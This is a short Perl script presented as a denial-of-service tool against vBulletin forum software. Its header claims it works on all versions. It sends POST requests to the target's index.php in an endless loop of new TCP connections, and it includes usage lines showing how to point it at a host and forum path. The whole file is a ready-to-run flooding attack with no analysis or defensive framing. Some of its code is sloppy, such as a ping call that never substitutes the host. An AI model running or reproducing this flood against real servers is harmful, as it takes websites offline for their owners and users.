# DOS Vbulletin 92% Works ;)
#
# Tested on all versions! and can DOS the server
#
#Perl Script
use Socket;
if (@ARGV < 2) { &usage }
$rand=rand(10);
$host = $ARGV[0];
$dir = $ARGV[1];
$host =~ s/(http:\/\/)//eg;
for ($i=0; $i<10; $i--)
{
$user="vb".$rand.$i;
$data = "s="
;
$len = length $data;
$foo = "POST ".$dir."index.php HTTP/1.1\r\n".
"Accept: */*\r\n".
"Accept-Language: en-gb\r\n".
"Content-Type: application/x-www-form-urlencoded\r\n".
"Accept-Encoding: gzip, deflate\r\n".
"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n".
"Host: $host\r\n".
"Content-Length: $len\r\n".
"Connection: Keep-Alive\r\n".
"Cache-Control: no-cache\r\n\r\n".
"$data";
my $port = "80";
my $proto = getprotobyname('tcp');
socket(SOCKET, PF_INET, SOCK_STREAM, $proto);
connect(SOCKET, sockaddr_in($port, inet_aton($host))) || redo;
send(SOCKET,"$foo", 0);
syswrite STDOUT, "+" ;
}
print "\n\n";
system('ping $host');
sub usage {
print "\tusage: \n";
print "\t$0 <host> </dir/>\n";
print "\tex: $0 127.0.0.1 /forum/\n";
print "\tex2: $0 127.0.0.1 /\n\n";
exit();
};
